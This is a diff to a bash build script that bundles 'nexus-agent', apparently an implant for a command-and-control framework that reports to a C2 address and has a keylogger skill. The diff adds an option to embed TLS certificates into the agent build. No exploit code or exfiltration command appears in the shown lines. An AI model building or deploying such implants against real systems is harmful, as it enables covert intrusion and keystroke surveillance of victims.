@@ -54,6 +54,7 @@ SERVER_ADDR="${NEXUS_C2_ADDR:-https://c2.example.com:50052}"
 DAYS=365
 NO_BUILD=0
 FORCE=0
+EMBED_CERTS=""
 
 log() { echo "[build-agent-bundles] $*"; }
 die() { echo "[build-agent-bundles] error: $*" >&2; exit 2; }
@@ -77,6 +78,7 @@ while [[ $# -gt 0 ]]; do
         --days)         DAYS="$2"; shift 2 ;;
         --no-build)     NO_BUILD=1; shift ;;
         --force)        FORCE=1; shift ;;
+        --embed-certs)  EMBED_CERTS="$2"; shift 2 ;;
         -h|--help)      usage ;;
         *) die "unknown argument: $1" ;;
     esac
@@ -142,6 +144,16 @@ if [[ $NO_BUILD -eq 1 ]]; then
     [[ -f "$ARTIFACT" ]] || die "artifact not found: $ARTIFACT  (drop --no-build to build it)"
     log "using existing artifact: $ARTIFACT"
 else
+    # WS6 Phase 6g: set embedded-certs env vars if --embed-certs was passed
+    EXTRA_FEATURES=""
+    if [[ -n "$EMBED_CERTS" ]]; then
+        [[ -d "$EMBED_CERTS" ]] || die "--embed-certs dir not found: $EMBED_CERTS"
+        export NEXUS_EMBED_CERTS=1
+        export NEXUS_CERT_DIR="$(cd "$EMBED_CERTS" && pwd)"
+        EXTRA_FEATURES="--features embedded-certs"
+        log "embedding certs from $NEXUS_CERT_DIR"
+    fi
+
     if [[ "$OS" == "win" ]]; then
         if ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
             die "MinGW cross-compiler not found. Install with:
@@ -152,11 +164,11 @@ else
         log "NOTE: keylogger BOF is stubbed when cross-compiling from Linux (build.rs uses"
         log "      cfg!(target_os=windows) which evaluates on the build host, not the target)."
         log "      The agent will run; the keylogger skill will not be available."
-        cargo build --release --target x86_64-pc-windows-gnu -p nexus-agent --bin nexus-agent
+        cargo build --release --target x86_64-pc-windows-gnu -p nexus-agent --bin nexus-agent $EXTRA_FEATURES
         ARTIFACT="target/x86_64-pc-windows-gnu/release/nexus-agent.exe"
     else
         log "building nexus-agent for Linux"
-        cargo build --release -p nexus-agent --bin nexus-agent
+        cargo build --release -p nexus-agent --bin nexus-agent $EXTRA_FEATURES
         ARTIFACT="target/release/nexus-agent"
     fi
     log "build complete: $ARTIFACT"
